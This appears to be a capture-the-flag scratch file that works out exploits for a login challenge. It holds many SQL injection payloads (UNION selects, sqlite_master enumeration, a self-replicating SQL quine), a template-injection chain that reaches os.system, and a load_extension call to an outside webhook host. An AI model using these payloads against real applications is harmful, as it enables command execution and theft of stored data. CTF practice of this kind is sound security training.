

class Flag():
    def __init__(self, flag):
        self.flag = 'flag'

    def __str__(self):
        return 1
        # return self.flag if session.get('is_admin', False) else "Oops, You're not admin (・へ・)"


def hint():

    _ = '_=%r;return (_%%_)'
    return (_ % _)


FLAG = Flag('flag')

print(hint())

_ = '_=%r;return (_%%_)'
print(_ % _)
print(_)
name = 'bin'
print(_ % name)
# _='asd';return (_%_)
print('_=%r;return (_%%_)' % '_=%r;return (_%%_)')
# _='_=%r;return (_%%_)';return (_%_)
# '_='_=%r;return (_%%_)';return (_%%_)'
print(' %r %%' % 'aw')
print(name)
print(f'{name}')
().__class__.__base__.__subclasses__()
print(f'{().__class__.__base__.__subclasses__()[132]}')
a = ().__class__.__base__.__subclasses__()[-1]
# name = input()
# print(f'{().__class__.__base__.__subclasses__()[-1].__getattribute__("flag")}')
# def login():
#     a = f'{raise Exception("Sorry, no numbers below zero")}'

# raise Exception("Sorry, no numbers below zero")

# login()

print(f'{().__class__.__base__.__subclasses__()[132]}')


username = 'query _=%r;return (_%%_)'
password = 'awer'
query = f"select username, password from users where username='{username}' and password='{password}'"
print(query)

print()
_ = "000' UNION SELECT '%r' AS username, 2 AS password--"
print(_ % _)


_ = ''

a = 'AAA{a}aaa' 
b = 'BBB {a} bbb'.format(a=a)
print(b)


'''
_='_=%r;return (_%%_)';return (_%_)

{{ ().<_class<_.<_base<_.<_subclasses<_()[132]
.<_init<_.<_globals<_['sĀstem']('id') }}

{{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}
{{ ().__class__.__base__.__subclasses__() }}
{flag.__init__}
{flag.__init__.__globals__}
{flag.flag}
admin' --
000' UNION SELECT 1, 2 FROM users--
000' UNION SELECT 1, 2--
000' UNION SELECT username, password--
000' UNION SELECT 1 AS username, 2 AS password--
000' UNION SELECT {username} AS username, 2 AS password--
000' UNION SELECT "" AS username, 2 AS password--
000' UNION SELECT "000' UNION SELECT AS username, 2 AS password--" AS username, 2 AS password--
000' UNION SELECT % AS username, 2 AS password--
000' UNION SELECT {username} AS username, 2 AS password--
_ = 000' UNION SELECT %r AS username, 2 AS password--
_ % _

000' UNION SELECT %r AS username, 2 AS password-- % username
000' UNION SELECT "%r" AS username, 2 AS password-- % username
000' UNION SELECT "{flag.flag}" AS username, "%r" AS password-- % password
000' UNION SELECT "{flag.flag}" AS username, "?" AS password-- % password
000' UNION SELECT "{flag.flag}" AS username, "%r" AS password--" % password
000' UNION SELECT "{fl  ag.flag}" AS username, "%r" AS password--" % password #
000' UNION SELECT "{flag.flag}" AS username, "{username}" AS password--" % password #
000' UNION SELECT "{flag.flag}" AS username, '{username}' AS password--" % password #
000' UNION SELECT "{flag.flag}" AS username, '{username}' AS password--"#
' OR 1 == 1 UNION SELECT "{flag.flag}" AS username, "" AS password--"#
000' UNION SELECT "{flag.flag}" AS username, (INSERT INTO users(username, password) VALUES('a', 'b')) AS password--"#
000' UNION SELECT "{flag.flag}" AS username, ? AS password--" % 1 "
000' UNION SELECT "{flag.flag}" AS username, printf('%r', 'asd') AS password-- % password
000' UNION SELECT "{flag.flag}" AS username, "000' UNION SELECT "{flag.flag}" AS username, " AS password-- " AS password-- 
000' UNION SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, ) AS password-- ") AS password-- 
000' UNION SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, (SELECT "{flag.flag}" AS username, ) AS password-- ") AS password-- 
000' UNION SELECT {username} AS username, 2 AS password-- % username
000' UNION SELECT {username} AS username, 2 AS password--
_='000' UNION SELECT %r AS username, 2 AS password--';return(_%_)

000' UNION SELECT SQLITE_VERSION() AS username, 2 AS password--
000' UNION SELECT 1 AS username, schema() AS password--
000' UNION SELECT tbl_name AS username, 2 AS password FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--

select username, password from users where username='000' UNION SELECT "%r" AS username -- and password=' -- , 2 AS password--' -- {password}
select username, password from users where username='000' UNION SELECT "%r" AS username /* and password=' */ , 2 AS password--' -- {password}
000' UNION SELECT "{flag.flag}" AS username, /* and password=' */"AS password--" AS password--


000'
WITH x AS (
       
    UNION SELECT "{flag.flag}" AS username, x AS password--

)
x

000'
(
    UNION SELECT "{flag.flag}" AS username, x AS password--
) AS x
x

000' UNION SELECT "{flag.flag}" AS username, load_extension('//webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8') AS password--


select username, password FROM users WHERE username='

{flag.flag}

' and password='

' UNION SELECT '{flag.flag}' AS username, 
REPLACE(s.q, 'A'||'B', s.q) 
AS password FROM (SELECT "
' UNION SELECT '{flag.flag}' AS username, 
REPLACE(s.q, 'A'||'B', s.q) 
AS password FROM (SELECT 'AB' AS q) AS s
" q) AS s
 
 
--"%r" AS username -- and password=' -- , 2 AS password--' -- {password}


' UNION SELECT '{flag.flag}' AS username, 
printf(s.q, s.q)
AS password FROM (SELECT "
' UNION SELECT '{flag.flag}' AS username, 
printf(s.q, s.q)
AS password FROM (SELECT '%s' AS q) AS s--
" AS q) AS s--

username: {flag.flag}
res password: ' UNION SELECT '{flag.flag}' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ' '' UNION SELECT ''{flag.flag}'' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ''%s'' AS q) AS s-- ' AS q) AS s--
res username: {flag.flag}
res password: ' UNION SELECT '{flag.flag}' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ' '' UNION SELECT ''{flag.flag}'' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ''%s'' AS q) AS s-- ' AS q) AS s--

' UNION SELECT '{flag.flag}' AS username, 
printf(s.q, substr(quote(s.q), 2, 132))
AS password FROM (SELECT '
'' UNION SELECT ''{flag.flag}'' AS username, 
printf(s.q, substr(quote(s.q), 2, 132))
AS password FROM (SELECT ''%s'' AS q) AS s--
' AS q) AS s--

' UNION SELECT '{flag.flag}' AS username, 
printf(s.q, substr(quote(s.q), 2, 132))
AS password FROM (SELECT '
'' UNION SELECT ''{flag.flag}'' AS username, 
printf(s.q, substr(quote(s.q), 2, 132))
AS password FROM (SELECT ''%s'' AS q) AS s--
' AS q) AS s--

' UNION SELECT '{flag.flag}' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ' '' UNION SELECT ''{flag.flag}'' AS username, printf(s.q, substr(quote(s.q), 2, 132)) AS password FROM (SELECT ''%s'' AS q) AS s-- ' AS q) AS s--
'''

"""

' UNION SELECT '{flag.flag}' AS username, 
printf(s.q, substr(quote(s.q), 2, 130))
AS password FROM (SELECT ''' UNION SELECT ''{flag.flag}'' AS username, 
printf(s.q, substr(quote(s.q), 2, 130))
AS password FROM (SELECT ''%s'' AS q) AS s--' AS q) AS s--

"""